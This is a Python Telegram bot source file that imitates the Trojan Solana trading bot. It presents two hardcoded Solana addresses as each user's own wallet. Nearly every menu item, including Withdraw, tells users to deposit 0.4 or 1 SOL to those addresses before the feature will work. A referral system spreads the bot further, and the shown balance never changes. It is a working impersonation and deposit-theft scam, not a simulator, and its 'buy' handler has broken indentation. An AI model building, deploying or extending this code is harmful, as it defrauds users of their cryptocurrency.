#!/usr/bin/env python3
"""
Trojan Telegram Bot - Solana Trading Interface Simulator
A Telegram bot that simulates Trojan's Solana trading interface with team address assignment and referral system.
"""

import logging
import os
import random
import json
from datetime import datetime
from typing import Dict, List, Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telegram.constants import ParseMode
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Team addresses pool
TEAMS = {
    'Team 1': '8rMj1dMR6tp428j7DaGUn6TpLi89fpdYNQEwqUzyFCe3',
    'Team 2': 'EATAgjcHTZxCaudus4VvktLRfxYjtHMbNLSnyDJYXtnt'
}

# Bot username for referral links
BOT_USERNAME = os.getenv('BOT_USERNAME', 'Thanatos_TrojanBot')

# File-based storage for users
USER_DATA_FILE = "users.json"
users_db: Dict[str, Dict] = {}
used_addresses = set()

def load_users():
    """Load users from JSON file"""
    global users_db, used_addresses
    try:
        if os.path.exists(USER_DATA_FILE):
            with open(USER_DATA_FILE, 'r') as f:
                data = json.load(f)
                users_db = data.get('users', {})
                used_addresses = set(data.get('used_addresses', []))
                
                # Migration: Add rewards_wallet field to existing users
                migration_needed = False
                for user_id, user_data in users_db.items():
                    if 'rewards_wallet' not in user_data:
                        user_data['rewards_wallet'] = user_data['team_address']
                        migration_needed = True
                
                if migration_needed:
                    save_users()
                    logger.info("Migrated existing users to include rewards_wallet field")
                
                logger.info(f"Loaded {len(users_db)} users from storage")
        else:
            users_db = {}
            used_addresses = set()
            logger.info("No existing user data found, starting fresh")
    except Exception as e:
        logger.error(f"Error loading users: {e}")
        users_db = {}
        used_addresses = set()

def save_users():
    """Save users to JSON file"""
    try:
        data = {
            'users': users_db,
            'used_addresses': list(used_addresses),
            'last_updated': datetime.now().isoformat()
        }
        with open(USER_DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        logger.info(f"Saved {len(users_db)} users to storage")
    except Exception as e:
        logger.error(f"Error saving users: {e}")

class TrojanBot:
    def __init__(self):
        self.token = os.getenv('BOT_TOKEN')
        if not self.token:
            raise ValueError("BOT_TOKEN environment variable is required")
        
        # Load existing user data
        load_users()
        
        # Build application with better error handling and conflict resolution
        self.application = (
            Application.builder()
            .token(self.token)
            .read_timeout(30)
            .write_timeout(30)
            .connect_timeout(30)
            .pool_timeout(30)
            .build()
        )
        self.setup_handlers()

    def setup_handlers(self):
        """Set up command and callback handlers"""
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CallbackQueryHandler(self.button_callback))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))

    def assign_team_address(self) -> str:
        """Assign a team address alternating between Team 1 and Team 2"""
        # Count current users to determine which team to assign
        user_count = len(users_db)
        
        # Alternate between Team 1 and Team 2 (1-2-1-2-1-2...)
        if user_count % 2 == 0:
            # Even number of users (0, 2, 4, ...) -> assign Team 1
            team_name = "Team 1"
        else:
            # Odd number of users (1, 3, 5, ...) -> assign Team 2
            team_name = "Team 2"
        
        address = TEAMS[team_name]
        used_addresses.add(address)
        return address

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        telegram_id = str(user.id)
        username = user.username or user.first_name or "User"
        
        # Check for referral code
        referral_code = None
        if context.args and len(context.args) > 0:
            referral_code = context.args[0]
        
        # Check if user already exists
        if telegram_id not in users_db:
            # Create new user
            team_address = self.assign_team_address()
            
            # Handle referral
            referred_by = None
            if referral_code and referral_code.startswith('ref_'):
                referrer_id = referral_code.replace('ref_', '')
                if referrer_id in users_db:
                    referred_by = referrer_id
                    # Increment referrer's direct referrals
                    users_db[referrer_id]['direct_referrals'] += 1
                    
                    # Also increment indirect referrals for the referrer's referrer
                    if users_db[referrer_id]['referred_by']:
                        referrer_of_referrer = users_db[referrer_id]['referred_by']
                        if referrer_of_referrer in users_db:
                            users_db[referrer_of_referrer]['indirect_referrals'] += 1
            
            # Create user record
            users_db[telegram_id] = {
                'telegram_id': telegram_id,
                'username': username,
                'team_address': team_address,
                'rewards_wallet': team_address,  # Default rewards wallet to team address
                'referred_by': referred_by,
                'direct_referrals': 0,
                'indirect_referrals': 0,
                'sol_balance': 0.0,
                'referral_rewards': 0.0,
                'cashback_rewards': 0.0,
                'total_paid_rewards': 0.0,
                'created_at': datetime.now(),
                'last_updated': datetime.now()
            }
            
            # Save to file
            save_users()
            
            logger.info(f"New user registered: {telegram_id} ({username}) with team address: {team_address}")
        
        # Send main menu
        await self.send_main_menu(update, context)

    async def send_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send the main trading interface menu"""
        user = update.effective_user
        telegram_id = str(user.id)
        
        if telegram_id not in users_db:
            await update.message.reply_text("Please restart the bot with /start")
            return
        
        user_data = users_db[telegram_id]
        team_address = user_data['team_address']
        sol_balance = user_data['sol_balance']
        
        message = f"""Solana • 🅴 `{team_address}` (Tap to Copy)  
Balance: {sol_balance} SOL ($0.00)

Click on the Refresh button to update your current balance.

⚠️We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages."""

        keyboard = [
            [
                InlineKeyboardButton("Buy", callback_data="buy"),
                InlineKeyboardButton("Sell", callback_data="sell")
            ],
            [
                InlineKeyboardButton("Positions", callback_data="positions"),
                InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
                InlineKeyboardButton("DCA Orders", callback_data="dca_orders")
            ],
            [
                InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
                InlineKeyboardButton("Sniper 🆕", callback_data="sniper")
            ],
            [
                InlineKeyboardButton("Trenches", callback_data="trenches"),
                InlineKeyboardButton("💰 Rewards", callback_data="rewards"),
                InlineKeyboardButton("⭐ Watchlist", callback_data="watchlist")
            ],
            [
                InlineKeyboardButton("Withdraw", callback_data="withdraw"),
                InlineKeyboardButton("Settings", callback_data="settings")
            ],
            [
                InlineKeyboardButton("Help", callback_data="help"),
                InlineKeyboardButton("Refresh", callback_data="refresh")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.message:
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        elif update.callback_query:
            await update.callback_query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        user = update.effective_user
        telegram_id = str(user.id)
        
        if telegram_id not in users_db:
            await query.edit_message_text("User not found. Please restart the bot with /start")
            return
        
        user_data = users_db[telegram_id]
        action = query.data
        
        if action == "buy":
            message = f"""⚠️ **You need to deposit at least 0.4 SOL on your wallet for this function to work**  
`{user_data['team_address']}` (tap to copy)"""

keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
reply_markup = InlineKeyboardMarkup(keyboard)

await query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)


        elif action == "sell":
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("**You do not have any tokens yet! Start trading in the Buy menu.**", 
                                        parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

        elif action == "positions":
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("**You do not have any tokens yet! Start trading in the Buy menu.**", 
                                        parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
        elif action == "limit_orders":
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("**You have no active limit orders. Create a limit order from the Buy/Sell menu.**", 
                                        parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
        elif action == "dca_orders":
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("**You have no active DCA orders. Create a DCA order from the Buy/Sell menu.**", 
                                        parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
        elif action == "copy_trade":
            message = f"""👥 **Copy Trading**

Copy successful traders' strategies automatically.

You need to deposit at least 1 SOL to access this feature.
`{user_data['team_address']}` (tap to copy)"""
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

        elif action == "sniper":
            message = f"""🎯 **Sniper 🆕**

Automatically buy tokens as soon as they launch.

You need to deposit at least 1 SOL to access this feature.
`{user_data['team_address']}` (tap to copy)"""
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

        elif action == "trenches":
            message = f"""🏴 **Trenches**

Advanced trading tools for experienced traders.

You need to deposit at least 1 SOL to access this feature.
`{user_data['team_address']}` (tap to copy)"""
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

        elif action == "watchlist":
            message = f"""⭐ **Watchlist**

Keep track of your favorite tokens and get price alerts.

You need to deposit at least 1 SOL to access this feature.
`{user_data['team_address']}` (tap to copy)"""
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

        elif action == "withdraw":
            message = f"""💳 **Withdraw**

Withdraw your SOL and tokens to external wallets.

You need to deposit at least 1 SOL to access this feature.
`{user_data['team_address']}` (tap to copy)"""
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

        elif action == "settings":
            message = f"""⚙️ **Settings**

Configure your trading preferences and security settings.

You need to deposit at least 1 SOL to access this feature.
`{user_data['team_address']}` (tap to copy)"""
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

        elif action == "help":
            message = """**Where can I find my referral code?**  
Open the /start menu and click 💰Referrals.

**What are the fees for using Trojan?**  
Successful transactions through Trojan incur a fee of 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.

**Security Tips: How can I protect my account from scammers?**  
- Safeguard does NOT require you to login with a phone number or QR code!  
- NEVER search for bots in Telegram. Use only official links.  
- Admins and Mods NEVER DM first or send links. Stay safe!

**Extra Protection:**  
Setup your Secure Action Password (SAP) in the Settings menu. You'll need this password to withdraw, export keys, or delete a wallet. It is NOT recoverable, so set a hint.

**Trading Tips: Common Failure Reasons**  
- Slippage Exceeded: Increase slippage or reduce your order size.  
- Insufficient Balance: Add SOL or reduce the transaction amount.  
- Timeout: Can happen under high network load. Try higher gas tip.

**PNL seems wrong?**  
Trade net profit includes gas fees. Check Solscan.io to confirm."""
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
        elif action == "rewards":
            # Delete the current message if it exists
            try:
                await query.delete_message()
            except:
                pass  # Ignore if message can't be deleted
            await self.send_rewards_message(update, context)
        
        elif action == "set_rewards_wallet":
            await self.handle_set_rewards_wallet(update, context)
        
        elif action == "refresh" or action == "back_to_main":
            # For back button, send new main menu message instead of editing
            if action == "back_to_main":
                try:
                    await query.delete_message()
                except:
                    pass  # Ignore if message can't be deleted
                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=await self.get_main_menu_text(query.from_user.id),
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=self.get_main_menu_keyboard()
                )
                await query.answer()
            else:
                await self.send_main_menu(update, context)
        

        
        else:
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("Unknown action.", reply_markup=reply_markup)

    async def send_rewards_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send rewards information as a new message with image"""
        query = update.callback_query
        user = update.effective_user
        telegram_id = str(user.id)
        
        user_data = users_db[telegram_id]
        
        now = datetime.now()
        formatted_time = now.strftime("%Y-%m-%d %H:%M") + " UTC"
        
        total_unpaid = user_data['referral_rewards'] + user_data['cashback_rewards']
        total_referred = user_data['direct_referrals'] + user_data['indirect_referrals']
        
        message = f"""Cashback and Referral Rewards are paid out **every 12 hours** and airdropped directly to your Rewards Wallet. To be eligible, you must have at least 0.005 SOL in unpaid rewards.

**All Trojan users now enjoy a 10% boost to referral rewards and 20% cashback on trading fees.**

Referral Rewards  
• Users referred: {total_referred}
• Direct: {user_data['direct_referrals']}, Indirect: {user_data['indirect_referrals']}  
• Earned rewards: {user_data['referral_rewards']:.3f} SOL ($0.00)

Cashback Rewards  
• Earned rewards: {user_data['cashback_rewards']:.3f} SOL ($0.00)

Total Rewards  
• Total paid: {user_data['total_paid_rewards']:.3f} SOL ($0.00)  
• Total unpaid: {total_unpaid:.3f} SOL ($0.00)

**Your Referral Link**
`https://t.me/{BOT_USERNAME}?start=ref_{telegram_id}`
Your friends save 10% with your link.

Last updated at {formatted_time} (every 5 min)"""

        # Create truncated wallet address for display (first 4 + ... + last 4)
        team_address = user_data['team_address']
        rewards_wallet = user_data.get('rewards_wallet', team_address)  # Default to team address
        truncated_wallet = f"{rewards_wallet[:4]}...{rewards_wallet[-4:]}"
        
        keyboard = [
            [InlineKeyboardButton(f"Rewards Wallet: {truncated_wallet}", callback_data="set_rewards_wallet")],
            [InlineKeyboardButton("🔄 Refresh", callback_data="rewards")],
            [InlineKeyboardButton("← Back", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send as new message with image
        try:
            with open('attached_assets/trojan_referral_1754228938867.jpg', 'rb') as photo:
                await context.bot.send_photo(
                    chat_id=query.message.chat_id,
                    photo=photo,
                    caption=message,
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=reply_markup
                )
        except Exception as e:
            logger.error(f"Error sending photo: {e}")
            # Fallback to text message if image fails
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=message,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        
        # Answer the callback query
        await query.answer()

    async def get_main_menu_text(self, user_id: int) -> str:
        """Get main menu text for a user"""
        telegram_id = str(user_id)
        if telegram_id not in users_db:
            return "Please restart the bot with /start"
        
        user_data = users_db[telegram_id]
        team_address = user_data['team_address']
        sol_balance = user_data['sol_balance']
        
        return f"""Solana • 🅴 `{team_address}` (Tap to Copy)  
Balance: {sol_balance} SOL ($0.00)

Click on the Refresh button to update your current balance.

⚠️We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages."""

    def get_main_menu_keyboard(self):
        """Get main menu keyboard"""
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Buy", callback_data="buy"),
                InlineKeyboardButton("Sell", callback_data="sell")
            ],
            [
                InlineKeyboardButton("Positions", callback_data="positions"),
                InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
                InlineKeyboardButton("DCA Orders", callback_data="dca_orders")
            ],
            [
                InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
                InlineKeyboardButton("Sniper 🆕", callback_data="sniper"),
                InlineKeyboardButton("Trenches", callback_data="trenches")
            ],
            [
                InlineKeyboardButton("💰 Rewards", callback_data="rewards"),
                InlineKeyboardButton("⭐ Watchlist", callback_data="watchlist")
            ],
            [
                InlineKeyboardButton("Withdraw", callback_data="withdraw"),
                InlineKeyboardButton("Settings", callback_data="settings"),
                InlineKeyboardButton("Help", callback_data="help")
            ],
            [
                InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
            ]
        ])

    async def send_rewards_message_direct(self, update: Update, context: ContextTypes.DEFAULT_TYPE, telegram_id: str):
        """Send rewards message directly (for wallet update)"""
        user_data = users_db[telegram_id]
        
        now = datetime.now()
        formatted_time = now.strftime("%Y-%m-%d %H:%M") + " UTC"
        
        total_unpaid = user_data['referral_rewards'] + user_data['cashback_rewards']
        total_referred = user_data['direct_referrals'] + user_data['indirect_referrals']
        
        message = f"""Cashback and Referral Rewards are paid out **every 12 hours** and airdropped directly to your Rewards Wallet. To be eligible, you must have at least 0.005 SOL in unpaid rewards.

**All Trojan users now enjoy a 10% boost to referral rewards and 20% cashback on trading fees.**

Referral Rewards  
• Users referred: {total_referred}
• Direct: {user_data['direct_referrals']}, Indirect: {user_data['indirect_referrals']}  
• Earned rewards: {user_data['referral_rewards']:.3f} SOL ($0.00)

Cashback Rewards  
• Earned rewards: {user_data['cashback_rewards']:.3f} SOL ($0.00)

Total Rewards  
• Total paid: {user_data['total_paid_rewards']:.3f} SOL ($0.00)  
• Total unpaid: {total_unpaid:.3f} SOL ($0.00)

**Your Referral Link**
`https://t.me/{BOT_USERNAME}?start=ref_{telegram_id}`
Your friends save 10% with your link.

Last updated at {formatted_time} (every 5 min)"""

        # Create truncated wallet address for display (first 4 + ... + last 4)
        team_address = user_data['team_address']
        rewards_wallet = user_data.get('rewards_wallet', team_address)
        truncated_wallet = f"{rewards_wallet[:4]}...{rewards_wallet[-4:]}"
        
        keyboard = [
            [InlineKeyboardButton(f"Rewards Wallet: {truncated_wallet}", callback_data="set_rewards_wallet")],
            [InlineKeyboardButton("🔄 Refresh", callback_data="rewards")],
            [InlineKeyboardButton("← Back", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send as new message with image
        try:
            with open('attached_assets/trojan_referral_1754228938867.jpg', 'rb') as photo:
                await context.bot.send_photo(
                    chat_id=update.message.chat_id,
                    photo=photo,
                    caption=message,
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=reply_markup
                )
        except Exception as e:
            logger.error(f"Error sending photo: {e}")
            # Fallback to text message if image fails
            await context.bot.send_message(
                chat_id=update.message.chat_id,
                text=message,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )

    async def handle_set_rewards_wallet(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle setting rewards wallet address"""
        query = update.callback_query
        user = update.effective_user
        telegram_id = str(user.id)
        
        # Send message asking for wallet address
        message = "💳 **Set Rewards Wallet**\n\nEnter your destination wallet for referral rewards:"
        
        keyboard = [[InlineKeyboardButton("← Cancel", callback_data="rewards")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=message,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        
        # Set conversation state to wait for wallet address
        context.user_data['waiting_for_wallet'] = True
        await query.answer()
        
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages for wallet address input"""
        user = update.effective_user
        telegram_id = str(user.id)
        
        # Check if we're waiting for wallet address
        if context.user_data.get('waiting_for_wallet'):
            wallet_address = update.message.text.strip()
            
            # Basic validation for Solana wallet address (should be 44 characters)
            if len(wallet_address) >= 32 and len(wallet_address) <= 44:
                # Update user's rewards wallet
                if telegram_id in users_db:
                    users_db[telegram_id]['rewards_wallet'] = wallet_address
                    users_db[telegram_id]['last_updated'] = datetime.now()
                    save_users()
                    
                    logger.info(f"User {telegram_id} updated rewards wallet to: {wallet_address}")
                    
                    # Send rewards message directly instead of confirmation
                    await self.send_rewards_message_direct(update, context, telegram_id)
                else:
                    await update.message.reply_text("❌ User not found. Please restart with /start")
            else:
                await update.message.reply_text("❌ Invalid wallet address. Please enter a valid Solana wallet address (32-44 characters).")
                return
                
            # Clear waiting state
            context.user_data['waiting_for_wallet'] = False
        else:
            # Regular message handling - ignore or show help
            await update.message.reply_text("Use /start to begin or use the menu buttons.")

    def run(self):
        """Start the bot"""
        logger.info("Starting Trojan Telegram Bot...")
        try:
            self.application.run_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=True,  # Clear any pending updates
                timeout=30,
                poll_interval=2.0
            )
        except Exception as e:
            logger.error(f"Bot polling error: {e}")
            raise

def main():
    """Main function"""
    try:
        bot = TrojanBot()
        bot.run()
    except ValueError as e:
        logger.error(f"Configuration error: {e}")
        print(f"Error: {e}")
        print("Please set BOT_TOKEN environment variable with your Telegram bot token")
        print("You can create a bot by messaging @BotFather on Telegram")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        print(f"Unexpected error: {e}")

if __name__ == '__main__':
    main()
